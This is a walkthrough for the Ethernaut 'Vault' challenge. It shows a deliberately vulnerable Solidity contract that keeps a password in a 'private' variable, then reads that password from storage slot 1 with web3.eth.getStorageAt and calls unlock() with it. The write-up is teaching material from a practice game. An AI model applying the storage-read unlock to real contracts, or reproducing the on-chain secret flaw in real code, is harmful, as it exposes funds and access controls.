# Vault – Level 8 Walkthrough

## Objective

This challenge provides a contract with a password stored in a `private` variable. Although the variable is marked private in Solidity, it still resides on the blockchain.  
The goal is to **read the private password stored in the contract’s storage** and use it to unlock the vault.

---

## Getting Started

1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Vault"** level
3. Click **“Get new instance”** and approve the MetaMask transaction
4. After deployment, the level’s contract is available as `contract` in your browser console
5. Copy the instance address:

    ```js
    contract.address
    ```

---

## Walkthrough

### Step 1: Understand the Contract

The relevant part of the challenge contract:

```solidity
contract Vault {
     bool public locked;
     bytes32 private password;

     constructor(bytes32 _password) public {
          locked = true;
          password = _password;
     }

     function unlock(bytes32 _password) public {
          if (password == _password) {
                locked = false;
          }
     }
}
```

**Explanation:**

- The `locked` variable is initially `true`.
- The `unlock()` function compares the input with the private `password`.
- Although `password` is marked private, it still resides on-chain and can be read via `web3.eth.getStorageAt`.

---

### Step 2: Read the Password from Storage

We can read the password directly from storage slot `1`:

```js
await web3.eth.getStorageAt(contract.address, 1)
```

**Explanation:**

- Storage slot `0` contains `locked`
- Storage slot `1` contains the `password`
- This function returns a `bytes32` value (e.g. `0xabc123...`)

---

### Step 3: Call the Unlock Function

Now that we have the password, we can unlock the vault:

```js
await contract.unlock("0x...") // Replace with actual password value
```

**Explanation:**

- This calls the `unlock` function with the correct `bytes32` password
- The comparison `password == _password` will pass and set `locked` to `false`

---

## What You Learn

This level teaches:

- **Private variables are not encrypted** in Ethereum — they are only hidden from other contracts but visible to anyone via storage inspection.
- **Blockchain data is transparent**; sensitive information should never be stored directly, even in "private" variables.
- Tools like `web3.eth.getStorageAt` allow direct access to contract storage.

---

## Resources Used

- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
- [Solidity Docs - Storage Layout](https://docs.soliditylang.org/en/v0.8.19/internals/layout_in_storage.html)
- [Web3.js getStorageAt](https://web3js.readthedocs.io/en/v1.10.0/web3-eth.html#getstorageat)
